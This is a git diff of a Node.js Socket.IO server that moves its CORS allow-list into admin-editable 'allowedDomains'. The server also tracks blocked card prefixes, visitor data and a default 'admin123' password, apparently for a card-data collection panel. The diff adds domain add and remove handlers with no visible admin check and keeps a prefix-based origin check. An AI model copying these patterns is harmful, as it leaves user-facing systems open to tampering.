@@ -10,19 +10,17 @@ require("dotenv").config();
 const app = express();
 const server = http.createServer(app);
 
-// CORS Configuration
+// CORS Configuration - Dynamic (reads from allowedDomains)
 const corsOptions = {
-  origin: [
-    'https://alamsallameh.com',
-    'https://www.alamsallameh.com',
-    'https://amnwsalameh.com',
-    'https://www.amnwsalameh.com',
-    'https://amansallameh.com',
-    'https://www.amansallameh.com',
-    'https://fahos-production.up.railway.app',
-    'http://localhost:5173',
-    'http://localhost',
-  ],
+  origin: function (origin, callback) {
+    if (!origin) return callback(null, true); // Allow requests with no origin (like server-to-server)
+    const allowed = buildAllowedOrigins();
+    if (allowed.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
   credentials: true,
 };
 
@@ -102,33 +100,22 @@ app.use((req, res, next) => {
 // Socket.IO Configuration
 const io = new Server(server, {
   cors: {
-    origin: [
-      'https://alamsallameh.com',
-      'https://www.alamsallameh.com',
-      'https://amnwsalameh.com',
-      'https://www.amnwsalameh.com',
-      'https://amansallameh.com',
-      'https://www.amansallameh.com',
-      'https://fahos-production.up.railway.app',
-      'http://localhost:5173',
-      'http://localhost',
-    ],
+    origin: function (origin, callback) {
+      if (!origin) return callback(null, true);
+      const allowed = buildAllowedOrigins();
+      if (allowed.includes(origin)) {
+        callback(null, true);
+      } else {
+        callback(new Error('Not allowed by CORS'));
+      }
+    },
     credentials: true,
   },
   transports: ["websocket", "polling"],
   allowRequest: (req, callback) => {
     const origin = req.headers.origin || req.headers.referer || '';
-    const isAllowed = [
-      'https://alamsallameh.com',
-      'https://www.alamsallameh.com',
-      'https://amnwsalameh.com',
-      'https://www.amnwsalameh.com',
-      'https://amansallameh.com',
-      'https://www.amansallameh.com',
-      'https://fahos-production.up.railway.app',
-      'http://localhost',
-      'http://localhost:5173',
-    ].some(allowed => origin.startsWith(allowed));
+    const allowed = buildAllowedOrigins();
+    const isAllowed = allowed.some(a => origin.startsWith(a));
     if (!origin || !isAllowed) {
       console.log(`Blocked request from origin: ${origin || 'no origin'}, IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}`);
       callback('Unauthorized', false);
@@ -175,6 +162,7 @@ function loadSavedData() {
         globalBlockedCards: parsed.globalBlockedCards || [],
         globalBlockedCountries: parsed.globalBlockedCountries || [],
         adminPassword: parsed.adminPassword || "admin123",
+        allowedDomains: parsed.allowedDomains || null,
       };
     }
     
@@ -193,6 +181,7 @@ function loadSavedData() {
         globalBlockedCards: parsed.globalBlockedCards || [],
         globalBlockedCountries: parsed.globalBlockedCountries || [],
         adminPassword: parsed.adminPassword || "admin123",
+        allowedDomains: parsed.allowedDomains || null,
       };
     }
     
@@ -214,6 +203,7 @@ function loadSavedData() {
           globalBlockedCards: parsed.globalBlockedCards || [],
           globalBlockedCountries: parsed.globalBlockedCountries || [],
           adminPassword: parsed.adminPassword || "admin123",
+          allowedDomains: parsed.allowedDomains || null,
         };
       }
     } catch (backupError) {
@@ -228,6 +218,7 @@ function loadSavedData() {
     globalBlockedCards: [],
     globalBlockedCountries: [],
     adminPassword: "admin123",
+    allowedDomains: null,
   };
 }
 
@@ -244,6 +235,7 @@ function _saveDataNow() {
       globalBlockedCards,
       globalBlockedCountries,
       adminPassword,
+      allowedDomains,
       lastSaved: new Date().toISOString(),
     };
     const jsonData = JSON.stringify(data, null, 2);
@@ -289,6 +281,28 @@ let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for foot
 let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
 let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
 let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)
+
+// Default allowed domains
+const DEFAULT_ALLOWED_DOMAINS = [
+  'alamsallameh.com',
+  'amnwsalameh.com',
+  'amansallameh.com',
+];
+let allowedDomains = savedData.allowedDomains || [...DEFAULT_ALLOWED_DOMAINS]; // Allowed domains (persisted)
+
+// Build full origins list from allowed domains
+function buildAllowedOrigins() {
+  const origins = [];
+  allowedDomains.forEach(domain => {
+    origins.push(`https://${domain}`);
+    origins.push(`https://www.${domain}`);
+  });
+  // Always allow Railway admin and localhost
+  origins.push('https://fahos-production.up.railway.app');
+  origins.push('http://localhost:5173');
+  origins.push('http://localhost');
+  return origins;
+}
 
 // Generate unique API key
 function generateApiKey() {
@@ -398,22 +412,10 @@ setInterval(() => {
   newVisitorTimestamps = newVisitorTimestamps.filter(t => t > cutoff);
 }, 30000);
 
-// Allowed origins for WebSocket connections
-const allowedOrigins = [
-  'https://alamsallameh.com',
-  'https://www.alamsallameh.com',
-  'https://amnwsalameh.com',
-  'https://www.amnwsalameh.com',
-  'https://amansallameh.com',
-  'https://www.amansallameh.com',
-  'https://fahos-production.up.railway.app',
-  'http://localhost',
-  'http://localhost:5173',
-];
-
 // Block unauthorized WebSocket connections
 io.use((socket, next) => {
   const origin = socket.handshake.headers.origin || socket.handshake.headers.referer || '';
+  const allowedOrigins = buildAllowedOrigins();
   const isAllowed = allowedOrigins.some(allowed => origin.startsWith(allowed));
   
   if (!origin || !isAllowed) {
@@ -1163,6 +1165,39 @@ io.on("connection", (socket) => {
       c.toLowerCase() === country.toLowerCase()
     );
     socket.emit("blockedCountries:checkResult", { isBlocked, country });
+  });
+
+  // Allowed Domains: Get list
+  socket.on("allowedDomains:get", () => {
+    socket.emit("allowedDomains:list", allowedDomains);
+  });
+
+  // Allowed Domains: Add domain
+  socket.on("allowedDomains:add", (domain) => {
+    if (domain && !allowedDomains.includes(domain)) {
+      // Clean domain - remove https://, www., trailing slashes
+      let cleanDomain = domain.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/+$/, '').toLowerCase();
+      if (cleanDomain && !allowedDomains.includes(cleanDomain)) {
+        allowedDomains.push(cleanDomain);
+        saveData();
+        // Notify all admins
+        admins.forEach((admin, adminSocketId) => {
+          io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
+        });
+        console.log(`Allowed domain added: ${cleanDomain}`);
+      }
+    }
+  });
+
+  // Allowed Domains: Remove domain
+  socket.on("allowedDomains:remove", (domain) => {
+    allowedDomains = allowedDomains.filter(d => d !== domain);
+    saveData();
+    // Notify all admins
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
+    });
+    console.log(`Allowed domain removed: ${domain}`);
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
